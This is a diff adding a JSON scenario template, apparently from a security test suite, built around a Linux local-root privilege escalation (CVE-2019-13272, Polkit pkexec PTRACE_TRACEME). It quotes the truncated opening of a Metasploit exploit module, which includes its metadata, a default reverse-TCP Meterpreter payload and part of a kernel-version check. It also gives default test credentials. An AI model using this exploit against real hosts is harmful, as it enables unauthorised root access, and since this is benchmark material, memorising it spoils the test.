@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47543",
+  "category": "A4_polkit",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Linux Polkit - pkexec helper PTRACE_TRACEME local root (Metasploit) (CVE-2019-13272)\n\nExploit source code (47543.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Compile\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Linux Polkit pkexec helper PTRACE_TRACEME local root exploit',\n      'Description'   => %q{\n          This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux\n          kernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but\n          not over an SSH session, as it requires execution from within the context of\n          a user with an active Polkit agent.\n          In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles\n          the recording of the credentials of a process that wants to create a ptrace\n          relationship, which allows local users to obtain root access by leveraging\n          certain scenarios with a parent-child process relationship, where a parent drops\n          privileges and calls execve (potentially allowing control by an attacker). One\n          contributing factor is an object lifetime issue (which can also cause a panic).\n          Another contributing factor is incorrect marking of a ptrace relationship as\n          privileged, which is exploitable through (for example) Polkit's pkexec helper\n          with PTRACE_TRACEME.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [\n          'Jann Horn',    # Discovery and exploit\n          'bcoles',       # Metasploit module\n          'timwr',        # Metasploit module\n      ],\n      'References'     => [\n          ['CVE', '2019-13272'],\n          ['EDB', '47133'],\n          ['PACKETSTORM', '153663'],\n          ['URL', 'https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1903'],\n      ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X64 ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'DefaultOptions' =>\n        {\n          'Payload'     => 'linux/x64/meterpreter/reverse_tcp',\n          'PrependFork' => true,\n        },\n      'DisclosureDate' => 'Jul 4 2019'))\n    register_advanced_options [\n      OptBool.new('ForceExploit', [false, 'Override check result', false]),\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def check\n    # Introduced in 4.10, but also backported\n    # Patched in 4.4.185, 4.9.185, 4.14.133, 4.19.58, 5.1.17\n    release = kernel_release\n    v = Gem::Version.new release.split('-').first\n\n    if v >= Gem::Version.new('5.\n```",
+  "cve": "CVE-2019-13272",
+  "exploitdb_id": "47543",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47543",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
